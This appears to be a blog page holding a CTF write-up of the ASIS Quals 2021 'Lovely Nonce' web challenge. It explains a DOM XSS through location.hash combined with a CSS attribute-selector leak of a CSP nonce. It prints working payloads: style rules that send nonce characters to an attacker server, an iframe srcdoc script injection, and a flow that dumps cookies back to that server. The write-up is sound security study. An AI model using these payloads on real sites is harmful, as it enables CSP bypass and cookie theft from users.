@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Jamie Polintan ">
+<meta name="description" content="Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
+TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
+Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise." />
+<meta name="keywords" content=", writeups, xss, css-leak, web" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#0c0c0d" />
+<link rel="canonical" href="https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/" />
+
+
+    <title>
+        
+            ASIS Quals 2021: Lovely Nonce :: Jam ⇆ Vie 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#0c0c0d">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#0c0c0d">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="ASIS Quals 2021: Lovely Nonce">
+<meta itemprop="description" content="Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
+TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
+Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise."><meta itemprop="datePublished" content="2021-10-24T13:49:21-07:00" />
+<meta itemprop="dateModified" content="2021-10-24T13:49:21-07:00" />
+<meta itemprop="wordCount" content="785"><meta itemprop="image" content="https://jamvie.net/img/JAMIE.png"/>
+<meta itemprop="keywords" content="writeups,xss,css-leak,web," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net/img/JAMIE.png"/>
+
+<meta name="twitter:title" content="ASIS Quals 2021: Lovely Nonce"/>
+<meta name="twitter:description" content="Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
+TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
+Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise."/>
+
+
+
+
+
+    <meta property="article:section" content="writeups" />
+
+
+
+    <meta property="article:published_time" content="2021-10-24 13:49:21 -0700 PDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ echo &#39;hello&#39;</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#fd262d;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/categories/">Categories</a></li><li><a href="https://jamvie.net/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-176711986-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/">ASIS Quals 2021: Lovely Nonce</a>
+            </h1>
+                <hr />
+                <aside id="toc">
+                <div class="toc-title">Table of Contents</div>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#exploit-in-detail">Exploit in Detail</a></li>
+    <li><a href="#the-exploit-flow">The Exploit Flow</a></li>
+    <li><a href="#relevant-sources">Relevant Sources</a></li>
+  </ul>
+</nav>
+                </aside>
+                <hr />
+
+            
+
+            <div class="post-content">
+                <p>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate <a href="https://ubcctf.github.io/authors/ming/">Ming</a> and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the <a href="https://ubcctf.github.io/2021/10/asisquals-2021-lovelynonces/">UBC CTF blog</a>.</p>
+<h2 id="tldr">TL;DR</h2>
+<p>CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.</p>
+<h2 id="recon">Recon</h2>
+<p>The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise. It&rsquo;s just one directive, <code>script-src</code>, with the randomly generated nonce value, which we can try to retrieve.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;nonce-$NONCE$&#39;&#34;</span>&gt;
+</code></pre></div>
+    <img src="https://jamvie.net/images/ASISnonceCSP.png"  alt="CSP"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>(Note: it is also possible to extract this nonce from the <code>script</code> tag on the same page)</p>
+<p>The cookie is set to the localhost domain - which is important moving forward with our exploit (we won&rsquo;t be injecting our payloads on the lovelynonce domain, it&rsquo;ll be on localhost).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
+			<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;flag&#39;</span>,
+			<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;flag{fake-flag}&#34;</span>,
+			<span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>,
+			<span style="color:#a6e22e">expires</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">now</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">1000</span>
+		})
+</code></pre></div><p>On the HTML of the page is a location.hash navigator that sets an element in the HTML to the value of whatever <code>document.location.hash</code> was.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$NONCE$&#34;</span>&gt;
+    	document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+    	window.<span style="color:#a6e22e">onhashchange</span> <span style="color:#f92672">=</span> ()=&gt;{
+    		<span style="color:#66d9ef">if</span>(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>) {
+          		<span style="color:#a6e22e">desc</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> decodeURIComponent(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
+				document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+        	}
+    	};
+    &lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>Test this out by appending <code>#%3Cp%3Etest%3C%2Fp%3E</code> (just the URLencoded version of <code>#&lt;p&gt;test&lt;/p&gt;</code>) to the challenge webpage and see how this code snippet works. This is an easy XSS vector, but obviously the CSP isn&rsquo;t letting us do something so trivial as <code>#&lt;script&gt;alert(1337)&lt;/script&gt;</code>.</p>
+<p>There&rsquo;s a report function that actually utilizes this browser-side JS to add a report form in the webpage.</p>
+<h2 id="exploit-in-detail">Exploit in Detail</h2>
+<p>The location hash is a potential XSS vector. You can copy-paste the webpage&rsquo;s nonce value into an iframe with the srcdoc attribute and achieve XSS.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script nonce=[THEIR_NONCE]&gt;alert(1)&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</code></pre></div><p>This works because iframes loaded with <code>srcdoc</code> aren&rsquo;t cross-origin. BUT, this also won&rsquo;t work for the challenge as the server generates unique nonces for each request, meaning that our nonce won&rsquo;t be the same nonce that the admin has when they load up our webpage with our iframe payload. The CSP is technically doing it&rsquo;s job, and even with the copy-pasted nonce and srcdoc iframe, this is just a self-XSS for now. Ideally, we want to find out the nonce of the webpage when the admin visits - and while they&rsquo;re still on the webpage, load up our iframe payload with the correct nonce.</p>
+<p>Nonces implemented via the meta-tag, or nonces within the script-tag can be leaked through CSS attribute selectors. Setting the hash to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">*</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>}<span style="color:#f92672">meta</span><span style="color:#f92672">[</span><span style="color:#f92672">content</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;script-src nonce-a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">background-image</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
+</code></pre></div><p>or</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>;<span style="color:#66d9ef">background</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
+</code></pre></div><p>will send a request to our server in the event that any element with the right attribute stuck to it has a value starting with <code>script-src nonce-a</code>. We can extrapolate this further to brute-force each character in the attribute value and use fetches to our server to extract the correct &lsquo;next character&rsquo; of the nonce.</p>
+<p>If the CSS attribute selector successfully finds a tag that matches the above conditions, then a request is fired to our server. Otherwise, no request is made to our server.</p>
+<p>To change the hash, we have the admin open a window to the vulnerable page (localhost:8000), identified by a name (
+<code>open(&quot;http://localhost:8000/&quot;, &quot;thisOneWindow&quot;)</code>), and after that, we can have the admin open a window with the same url, but with a different hash, and the same name (
+<code>open(&quot;http://localhost:8000/#aaaaa&quot;, &quot;thisOneWindow&quot;)</code>). The browser has this page cached, and as a result, we will still be using the same page, just with a different location hash.</p>
+<h2 id="the-exploit-flow">The Exploit Flow</h2>
+<p>The attack flow is as follows:</p>
+<ol>
+<li>
+<p>Admin visits our server, hosting an index.html that will load the challenge page.</p>
+</li>
+<li>
+<p>Iterating through the alphanumeric charset, the injected style tag in the hash tests for each char if it is in the nonce - and if so, sends a request back to our server.</p>
+</li>
+<li>
+<p>That request is processed by our Node backend, which pushes the correctly guessed character into an internal array.</p>
+</li>
+<li>
+<p>The JS in index.html (the browser JS) sets a short timeout and then tries to retrieve the value in that internal array from the backend, updating the nonce value guessed so far and testing the next char in line.</p>
+</li>
+<li>
+<p>This process repeats from step 2 until the entire nonce is leaked.</p>
+</li>
+<li>
+<p>With the full nonce, we set the iframe payload with the correct, complete nonce value that dumps cookies back to our server.</p>
+</li>
+<li>
+<p>Flag! <code>ASIS{nonces_disappointed_me_df393b}</code></p>
+</li>
+</ol>
+<h2 id="relevant-sources">Relevant Sources</h2>
+<ul>
+<li><a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html">Bypass CSP nonces with DOM XSS</a>
+<ul>
+<li>Explains how to use CSS attribute selectors to get nonce.</li>
+</ul>
+</li>
+<li><a href="https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d">Window Opener and XSS Vectors</a>
+<ul>
+<li>Explains how to exploit <code>location.hash</code>.</li>
+</ul>
+</li>
+<li><code>Robert's brain</code>
+<ul>
+<li>Found a way to inject a script tag that executes immediately even after the page has loaded.</li>
+</ul>
+</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/writeups">writeups</a></span><span class="tag"><a href="https://jamvie.net/tags/xss">xss</a></span><span class="tag"><a href="https://jamvie.net/tags/css-leak">css-leak</a></span><span class="tag"><a href="https://jamvie.net/tags/web">web</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>785 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-10-24 13:49 -0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/">
+                                <span class="button__text">RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
+            
+            
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-176711986-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    </body>
+</html>
